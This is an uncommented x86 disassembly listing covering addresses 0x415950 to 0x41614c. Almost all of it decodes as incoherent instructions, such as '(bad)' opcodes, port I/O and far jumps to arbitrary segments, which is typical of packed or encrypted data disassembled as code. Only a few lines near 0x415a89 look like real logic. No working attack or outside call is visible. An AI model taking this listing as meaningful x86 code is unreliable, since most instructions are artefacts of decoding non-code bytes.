  415950:	xchg   ebx,eax
  415951:	fcomip st,st(0)
  415953:	dec    ecx
  415954:	sub    WORD PTR [ecx-0x10ed6449],0x716a
  41595d:	shl    BYTE PTR [edx+ecx*1-0x66],cl
  415961:	hlt    
  415962:	inc    edx
  415963:	int3   
  415964:	jb     0x415998
  415966:	pop    ebp
  415967:	jge    0x4159db
  415969:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41596a:	out    dx,al
  41596b:	in     al,0x92
  41596d:	inc    edx
  41596e:	push   esp
  41596f:	mov    ah,BYTE PTR [edi]
  415971:	sbb    cl,BYTE PTR [esi+0x17]
  415974:	imul   ebp,DWORD PTR [ecx+edi*1],0xffffffd3
  415978:	xor    eax,DWORD PTR [edx]
  41597a:	pop    ss
  41597b:	and    DWORD PTR [ebx],0x6ed764e5
  415981:	xor    edi,DWORD PTR [edi+0x41]
  415984:	xor    al,0x34
  415986:	test   DWORD PTR [esi+0x6],eax
  415989:	mov    ds:0xc6cf1898,eax
  41598e:	imul   edx,DWORD PTR [eax-0x129b36f1],0x58
  415995:	lahf   
  415996:	out    dx,al
  415997:	mov    bl,0x2d
  415999:	pop    ss
  41599a:	push   esp
  41599b:	dec    ecx
  41599c:	(bad)  
  41599d:	(bad)  
  41599e:	xchg   ebx,eax
  41599f:	xor    DWORD PTR [eax+0x78],esp
  4159a2:	outs   dx,BYTE PTR ds:[esi]
  4159a3:	ds push edx
  4159a5:	or     eax,0x3d496280
  4159aa:	xlat   BYTE PTR ds:[ebx]
  4159ab:	jae    0x415a16
  4159ad:	jg     0x4159bb
  4159af:	fbld   TBYTE PTR [esi+0x653d23dc]
  4159b5:	inc    edi
  4159b6:	push   edi
  4159b7:	push   edi
  4159b8:	rcr    BYTE PTR [ecx+0x46],1
  4159bb:	xchg   ecx,eax
  4159bc:	xchg   esi,eax
  4159bd:	pop    edx
  4159be:	and    al,0x50
  4159c0:	add    BYTE PTR [esi-0x6f588612],bl
  4159c6:	sub    eax,0x17486a61
  4159cb:	cdq    
  4159cc:	nop
  4159cd:	(bad)  
  4159ce:	adc    cl,BYTE PTR [eax-0x58c1596c]
  4159d4:	mov    BYTE PTR [eax-0x2f5fc9a7],bh
  4159da:	xchg   edx,eax
  4159db:	dec    esp
  4159dc:	jmp    DWORD PTR [eax+0x4e]
  4159df:	xchg   ebp,eax
  4159e0:	jp     0x41597a
  4159e2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4159e3:	and    edx,esi
  4159e5:	xchg   ebx,eax
  4159e6:	ins    BYTE PTR es:[edi],dx
  4159e7:	sub    bl,bl
  4159e9:	or     ah,dl
  4159eb:	rcl    DWORD PTR [ecx+eiz*8],cl
  4159ee:	sbb    eax,ebp
  4159f0:	ror    DWORD PTR [eax+0x41],0x12
  4159f4:	push   0xffffffeb
  4159f6:	mov    esp,0x95ec029f
  4159fb:	outs   dx,BYTE PTR ds:[esi]
  4159fc:	inc    esp
  4159fd:	loope  0x415a44
  4159ff:	pushf  
  415a00:	pop    edx
  415a02:	push   0x243db62a
  415a07:	jg     0x41599f
  415a09:	mov    al,ds:0xcaaaaa66
  415a0e:	sar    BYTE PTR [ecx+ebx*4+0x5b],0x5a
  415a13:	pop    eax
  415a14:	jo     0x4159b9
  415a16:	outs   dx,DWORD PTR ds:[esi]
  415a17:	test   al,0xbc
  415a19:	jl     0x4159c8
  415a1b:	lds    ebp,FWORD PTR [eax]
  415a1d:	fsincos 
  415a1f:	mov    esi,0xa9a8a32b
  415a24:	dec    ebx
  415a25:	inc    eax
  415a26:	repnz push ebp
  415a28:	jns    0x4159fb
  415a2a:	push   ebx
  415a2b:	mov    BYTE PTR [ebp-0x669a25ba],bh
  415a31:	sub    al,0xe8
  415a33:	ds jp  0x4159df
  415a36:	dec    edi
  415a37:	xchg   al,al
  415a39:	scas   eax,DWORD PTR es:[edi]
  415a3a:	jnp    0x415a67
  415a3c:	adc    eax,0x6e7fadff
  415a41:	push   ds
  415a42:	repz ret 0x9999
  415a46:	xchg   esp,eax
  415a47:	shr    ch,1
  415a49:	fcomp  QWORD PTR [esi]
  415a4b:	mov    dl,0xad
  415a4d:	xor    al,0xb
  415a4f:	inc    ebx
  415a50:	jl     0x415aac
  415a52:	or     BYTE PTR [ebx],dl
  415a54:	fsub   QWORD PTR [edi-0xe09a483]
  415a5a:	xchg   ecx,eax
  415a5b:	ja     0x415a30
  415a5d:	inc    ebx
  415a5e:	mov    ebp,ebp
  415a60:	pop    esi
  415a61:	xor    ebp,edx
  415a63:	retf   
  415a64:	cdq    
  415a65:	(bad)  
  415a66:	leave  
  415a67:	adc    DWORD PTR [edx+0x37],0xd6fc0518
  415a6e:	nop
  415a6f:	mov    ebp,0x87ed83ce
  415a74:	loopne 0x415a22
  415a76:	xchg   BYTE PTR [ecx-0x79],dh
  415a79:	xlat   BYTE PTR ds:[ebx]
  415a7a:	inc    ecx
  415a7b:	inc    eax
  415a7c:	mov    WORD PTR [ebp+0x0],?
  415a7f:	pop    edi
  415a80:	jle    0x415a85
  415a82:	into   
  415a83:	jne    0x4136c2
  415a89:	mov    ecx,DWORD PTR [ebp-0x20]
  415a8c:	mov    cl,BYTE PTR [ebp+ecx*1-0xa4]
  415a93:	mov    dl,BYTE PTR [ebp-0x1]
  415a96:	cmp    cl,dl
  415a98:	je     0x420d32
  415a9e:	jmp    0x417e2b
  415aa3:	jb     0x415a63
  415aa5:	or     eax,0x7679f979
  415aaa:	mov    eax,ds:0xde6af8ab
  415aaf:	or     BYTE PTR [esi+0x5a],al
  415ab2:	adc    DWORD PTR [esi+0x57],ecx
  415ab5:	jge    0x415b31
  415ab7:	or     bl,BYTE PTR [edi+0x7a]
  415aba:	jp     0x415a9a
  415abc:	(bad)  
  415abd:	mov    ebp,0x138ebb9e
  415ac2:	mov    ch,0x30
  415ac4:	pop    edx
  415ac5:	push   0xffffffdb
  415ac7:	push   edx
  415ac8:	aaa    
  415ac9:	inc    ebp
  415aca:	scas   eax,DWORD PTR es:[edi]
  415acb:	call   0x6afc8e76
  415ad0:	xor    BYTE PTR [ecx],bh
  415ad2:	hlt    
  415ad3:	inc    ebp
  415ad4:	or     al,0xd4
  415ad6:	push   edi
  415ad7:	ret    0x7381
  415ada:	and    al,0xad
  415adc:	(bad)  
  415add:	js     0x415ab6
  415adf:	sub    DWORD PTR ds:0xd54f569b,0xffffff89
  415ae6:	das    
  415ae7:	rcr    ah,cl
  415ae9:	sub    BYTE PTR [edx+0x31acf92f],cl
  415aef:	cmc    
  415af0:	enter  0xfe6b,0x20
  415af4:	std    
  415af5:	jns    0x415b08
  415af7:	mov    cl,ch
  415af9:	and    WORD PTR [edi-0x1f],di
  415afd:	or     bl,dl
  415aff:	fcomip st,st(2)
  415b01:	sbb    ecx,DWORD PTR [edi+0x285fad1]
  415b07:	and    DWORD PTR [edi],esi
  415b09:	in     al,dx
  415b0a:	or     eax,0xc8aed395
  415b0f:	jo     0x415b6a
  415b11:	xchg   ecx,eax
  415b12:	outs   dx,DWORD PTR ds:[esi]
  415b13:	mov    ds:0x609262c1,al
  415b18:	repz push esi
  415b1a:	push   edx
  415b1b:	inc    eax
  415b1c:	mov    ebx,0xd49dfe10
  415b21:	mov    bh,0x1e
  415b23:	sub    eax,0x346b4bae
  415b28:	pop    esi
  415b29:	and    bh,BYTE PTR [edi]
  415b2b:	jmp    0xf7df:0xb6c6bf00
  415b32:	lods   al,BYTE PTR ds:[esi]
  415b33:	inc    edx
  415b34:	adc    edx,DWORD PTR [ebx-0x9]
  415b37:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415b38:	adc    BYTE PTR [ebp+0x2412876],al
  415b3e:	pop    esi
  415b3f:	dec    ebx
  415b40:	pushf  
  415b41:	dec    DWORD PTR [ecx+esi*8-0x551b0e46]
  415b48:	push   esi
  415b49:	in     al,0xbd
  415b4b:	int    0x62
  415b4d:	fild   QWORD PTR [ebx]
  415b4f:	pusha  
  415b50:	mov    ds:0x6cb1e244,al
  415b55:	call   0xd334a9ca
  415b5a:	mov    eax,0xb0714ba6
  415b5f:	sbb    ebx,edx
  415b61:	ss sti 
  415b63:	popa   
  415b64:	add    edi,DWORD PTR [esi-0x4eece37b]
  415b6a:	ret    0x1b2d
  415b6d:	cmp    dl,dl
  415b6f:	add    DWORD PTR [esi-0x65],0xe83c0654
  415b76:	sub    ecx,ebp
  415b78:	inc    ebx
  415b79:	mov    eax,0xbf8c0709
  415b7e:	xor    al,0xaf
  415b80:	jg     0x415ba5
  415b82:	sub    eax,0xe401fb48
  415b87:	xor    ch,BYTE PTR gs:[ecx+eax*4-0x75239dc0]
  415b8f:	lods   eax,DWORD PTR ds:[esi]
  415b90:	adc    DWORD PTR [ebx+0xe42f75c],ebx
  415b96:	int3   
  415b97:	out    0xa5,al
  415b99:	jns    0x415b60
  415b9b:	or     eax,0xe948b81f
  415ba0:	out    dx,al
  415ba1:	outs   dx,DWORD PTR ds:[esi]
  415ba2:	mov    bh,0xd9
  415ba4:	rcl    BYTE PTR [ebx+ecx*4],cl
  415ba7:	ret    0xfd97
  415baa:	and    eax,0x4f6e5edc
  415baf:	jp     0x415b6b
  415bb1:	jecxz  0x415b4e
  415bb3:	adc    eax,0x67b9c614
  415bb8:	enter  0x1b3b,0x14
  415bbc:	sbb    dh,0x25
  415bbf:	shr    ch,0x42
  415bc2:	push   ebp
  415bc3:	enter  0x7bc6,0x15
  415bc7:	sub    eax,0x9d8588d8
  415bcc:	es jge 0x415bbd
  415bcf:	mov    dh,0x32
  415bd1:	jo     0x415c2c
  415bd3:	jmp    FWORD PTR [esi-0x33a4c411]
  415bd9:	cdq    
  415bda:	fwait
  415bdb:	jge    0x415be6
  415bdd:	pusha  
  415bde:	xor    eax,0x3f02f8cd
  415be3:	add    ebx,ebp
  415be5:	mov    ebx,0x446591b4
  415bea:	loop   0x415b96
  415bec:	mov    ds:0x1091337d,al
  415bf1:	xchg   esi,eax
  415bf2:	mov    dh,0x91
  415bf4:	inc    di
  415bf6:	mov    DWORD PTR [eax],edx
  415bf8:	jb     0x415c3f
  415bfa:	test   BYTE PTR [ebp-0x2a9d61c1],dh
  415c00:	mov    ebp,0xb50414da
  415c05:	int    0x53
  415c07:	and    edi,DWORD PTR ds:0xe6ea2d54
  415c0d:	rol    DWORD PTR [edx-0x1b46101e],0xe
  415c14:	je     0x415c54
  415c16:	or     ecx,DWORD PTR [eax]
  415c18:	je     0x415bc7
  415c1a:	pop    edi
  415c1b:	dec    ebx
  415c1c:	pop    esi
  415c1d:	push   ebp
  415c1e:	sub    DWORD PTR [edi],eax
  415c20:	jns    0x415c25
  415c22:	je     0x415c8c
  415c24:	cmp    eax,0xf2c8a60e
  415c29:	test   al,0xa
  415c2b:	jbe    0x415bf0
  415c2d:	inc    ecx
  415c2e:	sti    
  415c2f:	daa    
  415c30:	out    0x19,al
  415c32:	clc    
  415c33:	lds    edi,FWORD PTR [edi+0x6f]
  415c36:	xchg   edx,eax
  415c37:	retf   0x4372
  415c3a:	dec    ch
  415c3c:	ret    
  415c3d:	jne    0x415c3d
  415c3f:	scas   eax,DWORD PTR es:[edi]
  415c40:	push   ds
  415c41:	call   0x339f:0x19f2b38f
  415c48:	js     0x415c7f
  415c4a:	call   0xc3947081
  415c4f:	arpl   sp,cx
  415c51:	shl    BYTE PTR [edi],0x7b
  415c54:	lock xchg DWORD PTR [edi],esi
  415c57:	mov    esi,0xf0a2e75e
  415c5c:	jmp    0x520f:0x4122ba43
  415c63:	sti    
  415c64:	mov    al,ds:0xb40af4f
  415c69:	dec    esp
  415c6a:	out    0xf5,al
  415c6c:	jl     0x415cb3
  415c6e:	add    ebp,ecx
  415c70:	or     esi,edx
  415c72:	and    al,0x24
  415c74:	or     DWORD PTR [edx],edx
  415c76:	or     bh,BYTE PTR [ebp+0x49]
  415c79:	pushf  
  415c7a:	lods   eax,DWORD PTR ds:[esi]
  415c7b:	add    al,0x25
  415c7d:	bound  edi,QWORD PTR [ebp-0x60]
  415c80:	sahf   
  415c81:	in     al,dx
  415c82:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415c83:	mov    al,ds:0x2eef733e
  415c88:	push   0xddbcbc71
  415c8d:	push   edi
  415c8e:	add    BYTE PTR [ebx],bl
  415c90:	aaa    
  415c91:	mov    ecx,0xdf8610b8
  415c96:	retf   0x7d01
  415c99:	mov    BYTE PTR [ecx+edx*8],bl
  415c9c:	sahf   
  415c9d:	ins    BYTE PTR es:[edi],dx
  415c9e:	in     al,0x5d
  415ca0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415ca1:	mov    ecx,0x5163059e
  415ca6:	jnp    0x415cfa
  415ca8:	mov    ebx,0x3b086c3a
  415cad:	into   
  415cae:	mov    DWORD PTR [eax-0x388d5966],ebp
  415cb4:	pop    esp
  415cb5:	cmp    ch,cl
  415cb7:	dec    esi
  415cb8:	imul   edi,DWORD PTR [edx+0x38486abb],0xffffffa4
  415cbf:	mov    ch,0x0
  415cc1:	jecxz  0x415cc4
  415cc3:	adc    DWORD PTR [eax-0x217f326a],ecx
  415cc9:	repnz cld 
  415ccb:	mov    DWORD PTR [edi+0x5331b45f],0x3b511d48
  415cd5:	inc    edi
  415cd6:	mov    esp,0xc9b5880d
  415cdb:	loop   0x415cac
  415cdd:	pop    eax
  415cde:	xor    al,0x87
  415ce0:	test   al,0x42
  415ce2:	in     eax,0xc
  415ce4:	mov    edi,DWORD PTR [edi+0x70fdc7eb]
  415cea:	and    al,0xdf
  415cec:	push   edi
  415ced:	xchg   esi,eax
  415cee:	repnz in al,dx
  415cf0:	push   ds
  415cf1:	jle    0x415cb5
  415cf3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415cf4:	xchg   DWORD PTR [ebp-0x4b469537],edx
  415cfa:	idiv   BYTE PTR [ecx+0x7603873]
  415d00:	pop    edx
  415d01:	xchg   edi,eax
  415d02:	or     BYTE PTR [edi],0x62
  415d05:	mov    ch,0x6
  415d07:	lods   eax,DWORD PTR ds:[esi]
  415d08:	push   cs
  415d09:	pusha  
  415d0a:	lahf   
  415d0b:	pop    edx
  415d0c:	in     al,0xd7
  415d0e:	cld    
  415d0f:	(bad)  
  415d10:	loopne 0x415d80
  415d12:	adc    al,0xe2
  415d14:	(bad)  
  415d16:	mov    eax,0x6085f213
  415d1b:	adc    al,0x69
  415d1d:	rcl    esp,cl
  415d1f:	cs sub al,0xda
  415d22:	lods   eax,DWORD PTR ds:[esi]
  415d23:	fnstsw WORD PTR [esi+ebp*8]
  415d26:	stos   BYTE PTR es:[edi],al
  415d27:	inc    esp
  415d28:	fmul   QWORD PTR [edx]
  415d2a:	popa   
  415d2b:	cdq    
  415d2c:	out    dx,eax
  415d2d:	adc    eax,0x4704c2ba
  415d32:	xchg   ecx,eax
  415d33:	xor    eax,0xd4ba88f0
  415d38:	int    0xa1
  415d3a:	jo     0x415d25
  415d3c:	aad    0x16
  415d3e:	call   eax
  415d40:	jl     0x415cd2
  415d42:	shl    BYTE PTR [edi],0x1c
  415d45:	(bad)  
  415d46:	outs   dx,DWORD PTR ds:[esi]
  415d47:	test   BYTE PTR [ebx-0x59a082d0],ch
  415d4d:	mov    ecx,0x401de6b4
  415d52:	ja     0x415d91
  415d54:	xlat   BYTE PTR ds:[ebx]
  415d55:	add    DWORD PTR [eax+eax*1+0x6c],ecx
  415d59:	sub    BYTE PTR [ecx+0x2fd86372],ah
  415d5f:	push   ds
  415d60:	or     edi,edi
  415d62:	mov    esp,0xb3d6ba1b
  415d67:	sbb    al,0xb6
  415d69:	adc    esp,ebx
  415d6b:	sbb    DWORD PTR [esi],0x45a24f3f
  415d71:	dec    esi
  415d72:	cmp    al,0xbd
  415d74:	push   edx
  415d75:	pop    eax
  415d76:	sub    eax,0x6d56c723
  415d7b:	jno    0x415d7f
  415d7d:	xor    al,0x97
  415d7f:	dec    ecx
  415d80:	dec    edx
  415d81:	mov    BYTE PTR [ebx+ecx*1-0xc],0x8d
  415d86:	add    eax,0xdfae926a
  415d8b:	mov    esi,0x2155d475
  415d90:	add    BYTE PTR [ebp-0x6877fddc],ch
  415d96:	int3   
  415d97:	or     ebp,0x81e2782
  415d9d:	mov    ecx,0x5c43ee6e
  415da2:	addr16 jmp 0x356b:0xf4a53c3f
  415daa:	aaa    
  415dab:	push   ss
  415dac:	push   ss
  415dad:	mov    esi,0x7d8d3235
  415db2:	mov    edx,0xc5303b65
  415db7:	mov    eax,ds:0x17034032
  415dbc:	sahf   
  415dbd:	fwait
  415dbe:	test   eax,0xbc0395b9
  415dc3:	push   edx
  415dc4:	xlat   BYTE PTR ds:[ebx]
  415dc5:	push   ecx
  415dc6:	pop    esi
  415dc7:	xchg   esi,eax
  415dc8:	push   0x8d6faf26
  415dcd:	xchg   edi,eax
  415dce:	push   0xe25b0a96
  415dd3:	imul   eax,DWORD PTR [ebp-0x2ce1c14b],0x7f
  415dda:	mov    dh,0x64
  415ddc:	lahf   
  415ddd:	or     esp,eax
  415ddf:	mov    BYTE PTR [ebx+esi*1+0x63],ah
  415de3:	bound  ebp,QWORD PTR [edi+edi*8+0xf8a346]
  415dea:	mov    ebx,0x10fa4089
  415def:	loope  0x415d9b
  415df1:	out    0x3,al
  415df3:	and    BYTE PTR [edx-0x11],al
  415df6:	mov    ?,WORD PTR [edi+edx*1-0x5b]
  415dfa:	mov    eax,0xf0d1c7ed
  415dff:	ja     0x415e3c
  415e01:	inc    ecx
  415e02:	fnsave [ecx]
  415e04:	pop    edi
  415e05:	lds    ebp,FWORD PTR [eax]
  415e07:	call   0xab15c9a6
  415e0c:	jecxz  0x415dac
  415e0e:	mov    WORD PTR [edx],cs
  415e10:	ja     0x415dc7
  415e12:	push   eax
  415e13:	adc    eax,0xd1229eae
  415e18:	mov    edi,0xef687a51
  415e1d:	mov    ?,edx
  415e1f:	mov    ebx,DWORD PTR [eax+edx*1+0x1c]
  415e23:	adc    al,0xad
  415e25:	enter  0xbddb,0x71
  415e29:	stc    
  415e2a:	pop    es
  415e2b:	daa    
  415e2c:	pop    es
  415e2d:	cdq    
  415e2e:	adc    bl,BYTE PTR [edx]
  415e30:	daa    
  415e31:	(bad)  
  415e32:	call   0x69f3751e
  415e37:	frstor [ebx]
  415e39:	cmc    
  415e3a:	and    dl,0xf3
  415e3d:	inc    esp
  415e3e:	rol    BYTE PTR [ecx-0x7],0x3f
  415e42:	lds    edx,FWORD PTR gs:[eax+0x394a2499]
  415e49:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415e4a:	and    al,0x8d
  415e4c:	fdiv   QWORD PTR [edx+0x2f5d3fb4]
  415e52:	adc    eax,esp
  415e54:	cmp    eax,0x3edfe374
  415e59:	test   eax,0x870f95cc
  415e5e:	pop    esi
  415e5f:	aam    0x67
  415e61:	(bad)  
  415e62:	push   edi
  415e63:	or     DWORD PTR [edi],0x6d6ca663
  415e69:	(bad)  
  415e6a:	(bad)  
  415e6b:	sub    al,0xd4
  415e6d:	inc    ebx
  415e6e:	(bad)  
  415e6f:	mov    ebp,0xbd9e27
  415e74:	pop    ecx
  415e75:	ret    
  415e76:	and    ebx,DWORD PTR [edx+0x4bf10adb]
  415e7c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415e7d:	dec    ecx
  415e7e:	adc    eax,0xba9beda1
  415e83:	aad    0x55
  415e85:	call   0x2a6e:0xb3b037a4
  415e8c:	xchg   edx,eax
  415e8d:	push   cs
  415e8e:	jae    0x415eec
  415e90:	fs mov esp,0xf71bfde2
  415e96:	cmp    bh,BYTE PTR [eax]
  415e98:	test   al,0xa2
  415e9a:	(bad)  
  415e9b:	test   dl,0xb5
  415e9e:	mov    bl,0x49
  415ea0:	pop    ebp
  415ea1:	ret    0xff3d
  415ea4:	jecxz  0x415e70
  415ea6:	mov    ecx,0x5c3041e8
  415eab:	jle    0x415e63
  415ead:	inc    edx
  415eae:	mov    esi,0x9ebc498c
  415eb3:	cmp    al,0x3b
  415eb5:	js     0x415ed1
  415eb7:	pop    ebx
  415eb8:	xchg   DWORD PTR [ecx+0x78bf8c5a],ebp
  415ebe:	mov    eax,ds:0xbddbc30
  415ec3:	adc    al,0x67
  415ec5:	push   ss
  415ec6:	jne    0x415e9e
  415ec8:	inc    edi
  415ec9:	shr    BYTE PTR [esi],cl
  415ecb:	xor    ch,ah
  415ecd:	out    dx,eax
  415ece:	(bad)  
  415ed0:	mov    esp,0xb9bc2d04
  415ed5:	(bad)  
  415ed6:	jecxz  0x415e72
  415ed8:	xchg   ebx,eax
  415ed9:	imul   edx,edi,0x2e5daff1
  415edf:	push   ecx
  415ee0:	add    di,di
  415ee3:	push   0xb8fd162c
  415ee8:	sbb    DWORD PTR [esi],eax
  415eea:	mov    ah,0x9a
  415eec:	fmul   QWORD PTR ds:0xce626236
  415ef2:	js     0x415f4a
  415ef4:	push   edx
  415ef5:	out    0x46,al
  415ef7:	sbb    eax,0x3c4b0d8
  415efc:	call   FWORD PTR [ecx+edx*1-0x7e]
  415f00:	pop    eax
  415f01:	pop    esi
  415f02:	fidiv  WORD PTR [ebp-0x5f62cca4]
  415f08:	(bad)  
  415f09:	mov    edx,0xd451ce2a
  415f0e:	ret    0xf4f6
  415f11:	ret    
  415f12:	push   ecx
  415f13:	mov    ds:0xc6698fa5,eax
  415f18:	dec    esi
  415f19:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415f1a:	popa   
  415f1b:	xchg   ch,bl
  415f1d:	xor    bh,BYTE PTR [eax-0x751caba9]
  415f23:	and    BYTE PTR [ebx+0x5a],bh
  415f26:	mov    BYTE PTR [ebp+0x4879565b],bl
  415f2c:	sbb    eax,0x842c0f15
  415f31:	adc    ebx,ecx
  415f33:	pop    esi
  415f34:	mov    eax,es:0x49af2abc
  415f3a:	mov    al,0xaf
  415f3c:	jmp    0x415f68
  415f3e:	pop    edx
  415f3f:	jecxz  0x415f9e
  415f41:	imul   esp,ecx,0xb8129f29
  415f47:	aas    
  415f48:	or     eax,0x421eb7b5
  415f4d:	into   
  415f4e:	xor    DWORD PTR [eax],ebp
  415f50:	xor    edi,DWORD PTR [ecx-0x2c18560b]
  415f56:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415f57:	push   0xe6b1655
  415f5c:	push   ebx
  415f5d:	lods   al,BYTE PTR ds:[esi]
  415f5e:	sub    bl,ah
  415f60:	push   0xffffffc1
  415f62:	les    esi,FWORD PTR [ecx]
  415f64:	sub    ebx,edi
  415f66:	std    
  415f67:	pop    edi
  415f68:	adc    al,ch
  415f6a:	cmc    
  415f6b:	mov    DWORD PTR [edi-0x62],ecx
  415f6e:	xchg   edi,eax
  415f6f:	and    eax,0x6b60812e
  415f74:	fnstcw WORD PTR [eax+ebx*8]
  415f77:	mov    edx,0x8514411b
  415f7c:	imul   ecx,DWORD PTR [ebx-0x3c3a1998],0xffffff80
  415f83:	jmp    0x639:0xf8146981
  415f8a:	sub    bh,0x9
  415f8d:	imul   ebp,DWORD PTR [ecx+0x3c],0x7acd5d7b
  415f94:	xor    cl,BYTE PTR [edx+0x23]
  415f97:	mov    esi,0x8312a3ea
  415f9c:	pushf  
  415f9d:	fisttp QWORD PTR [ebx-0x6c]
  415fa0:	ins    DWORD PTR es:[edi],dx
  415fa1:	sub    ch,dl
  415fa3:	and    esi,ebx
  415fa5:	jmp    0x310aec0c
  415faa:	add    al,0xaf
  415fac:	loope  0x415f80
  415fae:	out    dx,eax
  415faf:	adc    al,BYTE PTR [ebp+0x71]
  415fb2:	inc    esi
  415fb3:	out    dx,al
  415fb4:	aam    0xf2
  415fb6:	mov    al,0xe2
  415fb8:	cs stos BYTE PTR es:[edi],al
  415fba:	cmp    eax,0xdb7f828b
  415fbf:	xor    DWORD PTR ds:0x22b6ff9b,ebx
  415fc5:	dec    edx
  415fc6:	xchg   BYTE PTR [ecx],ch
  415fc8:	dec    edx
  415fc9:	(bad)  
  415fca:	sbb    DWORD PTR [ecx-0x1df4ae69],ebp
  415fd0:	repnz mov ds:0x6c9d592a,eax
  415fd6:	div    BYTE PTR [eax+0x20]
  415fd9:	fisubr WORD PTR [ebx+0x2b2db0c7]
  415fdf:	lods   eax,DWORD PTR ds:[esi]
  415fe0:	outs   dx,DWORD PTR ds:[esi]
  415fe1:	mov    edi,0xf4da3a5a
  415fe6:	rol    BYTE PTR [esi+0x630a2b55],1
  415fec:	jge    0x415f94
  415fee:	aaa    
  415fef:	adc    ecx,esp
  415ff1:	jno    0x415fb3
  415ff3:	adc    DWORD PTR [esi+eiz*1-0x4c],esi
  415ff7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415ff8:	push   edi
  415ff9:	jno    0x41603f
  415ffb:	addr16 pop esi
  415ffd:	loop   0x41600a
  415fff:	out    0x9d,al
  416001:	hlt    
  416002:	xchg   ebp,eax
  416003:	adc    BYTE PTR [edx],0x6c
  416006:	pop    eax
  416007:	rcl    DWORD PTR [esi+ecx*8],cl
  41600a:	sub    dh,dl
  41600c:	sti    
  41600d:	les    ebp,FWORD PTR [ebp-0x68]
  416010:	add    bh,BYTE PTR [esi]
  416012:	add    dl,bh
  416014:	cmp    BYTE PTR [edi+ebx*8+0x120b4748],bl
  41601b:	test   al,0x52
  41601d:	and    al,0x33
  41601f:	popf   
  416020:	loopne 0x415fb2
  416022:	cmp    BYTE PTR [ecx-0x51],dh
  416025:	push   esi
  416026:	lods   al,BYTE PTR ds:[esi]
  416027:	cli    
  416028:	lahf   
  416029:	jo     0x416070
  41602b:	dec    esp
  41602c:	loopne 0x415ff8
  41602e:	dec    BYTE PTR [ebx]
  416030:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416031:	ret    0xd692
  416034:	mov    ch,0x1f
  416036:	pop    esp
  416037:	sar    ch,0xf7
  41603a:	cld    
  41603b:	or     eax,0xa145bbc4
  416040:	or     eax,esp
  416042:	dec    eax
  416043:	je     0x41609a
  416045:	lock add eax,0xfe5c667
  41604b:	pop    ecx
  41604c:	sub    DWORD PTR [esi+0x25],esi
  41604f:	shl    edx,1
  416051:	ds push ebp
  416053:	cmp    eax,0xb4f0a1f6
  416058:	adc    eax,0xbacecff2
  41605d:	xor    edx,DWORD PTR ds:0xeed26bbd
  416063:	jmp    0x9b22:0x4e2b21e1
  41606a:	xchg   ebx,eax
  41606b:	xchg   ebp,eax
  41606c:	out    dx,al
  41606d:	(bad)  
  41606e:	shr    BYTE PTR [esi-0x3f17daca],1
  416074:	out    0x36,eax
  416076:	rcl    DWORD PTR [edx],0x4d
  416079:	xor    al,0x1
  41607b:	rol    BYTE PTR [ebp-0x33],1
  41607e:	add    esi,DWORD PTR [edi+0x1332bb44]
  416084:	pop    esi
  416085:	inc    edi
  416086:	stos   BYTE PTR es:[edi],al
  416087:	inc    ecx
  416088:	inc    ebp
  416089:	add    edi,DWORD PTR [eax+0x7f]
  41608c:	mov    bh,0x95
  41608e:	add    ebx,DWORD PTR [edi]
  416090:	jl     0x416034
  416092:	out    dx,eax
  416093:	mov    ?,ebp
  416095:	sub    eax,0x92a989aa
  41609a:	ss sbb al,0x71
  41609d:	ins    BYTE PTR es:[edi],dx
  41609e:	dec    edi
  41609f:	cmp    DWORD PTR [edx+0x5d],ecx
  4160a2:	mov    esp,0x8c5eac02
  4160a7:	add    eax,0x818be91b
  4160ac:	xor    cl,BYTE PTR [eax]
  4160ae:	pop    esi
  4160af:	ror    BYTE PTR [ebx-0x105faabe],0x17
  4160b6:	ss (bad) 
  4160b8:	fmulp  st(5),st
  4160ba:	xor    al,0xa3
  4160bd:	call   0xc67d9500
  4160c2:	mov    al,ds:0x320900e8
  4160c7:	or     edi,DWORD PTR [ebx+eax*1]
  4160ca:	lods   eax,DWORD PTR ds:[esi]
  4160cb:	pop    ds
  4160cc:	in     eax,dx
  4160cd:	sbb    eax,0x563e20b5
  4160d2:	push   ds
  4160d3:	pop    ecx
  4160d4:	push   ecx
  4160d5:	sti    
  4160d6:	add    esi,ebx
  4160d8:	mov    DWORD PTR [esi+0x1033f170],esp
  4160de:	rcr    DWORD PTR [ecx-0x31],cl
  4160e1:	add    al,0xe4
  4160e3:	fucom  st(4)
  4160e5:	sahf   
  4160e6:	adc    al,0xc2
  4160e8:	push   cs
  4160e9:	or     BYTE PTR [edx-0x3cda4264],0x52
  4160f0:	ss in  eax,0x6c
  4160f3:	mov    edi,0x90731515
  4160f8:	adc    dh,BYTE PTR [esi-0x20]
  4160fb:	xchg   edi,eax
  4160fc:	leave  
  4160fd:	xchg   edx,eax
  4160fe:	mov    ch,0x4
  416100:	inc    edi
  416101:	iret   
  416102:	test   eax,0xc2f93437
  416107:	(bad)  
  416108:	adc    DWORD PTR [esi+edi*4],edi
  41610b:	jmp    0x26fd7f93
  416110:	lea    ebx,[ebx+0x61]
  416113:	mov    ch,0x74
  416115:	clc    
  416116:	dec    edi
  416117:	ret    0x6fb7
  41611a:	dec    ebp
  41611b:	loop   0x4160ab
  41611d:	xor    ebp,DWORD PTR [ebp+0x6]
  416120:	pop    edx
  416121:	out    dx,eax
  416122:	imul   edi,eax,0x159599cb
  416128:	or     al,0xd0
  41612a:	xor    ch,bl
  41612c:	scas   al,BYTE PTR es:[edi]
  41612d:	mov    bh,0xd8
  41612f:	mov    edx,0x64ab8728
  416134:	out    dx,eax
  416135:	xor    BYTE PTR [eax],dh
  416137:	inc    ebx
  416138:	push   esi
  416139:	lock jg 0x41617f
  41613c:	mov    DWORD PTR [eax-0x13024cc4],edi
  416142:	enter  0xcfb9,0xc2
  416146:	enter  0xca3f,0xad
  41614a:	dec    esp
  41614b:	aaa    
  41614c:	or     BYTE PTR [edi-0x1f884391],0x12
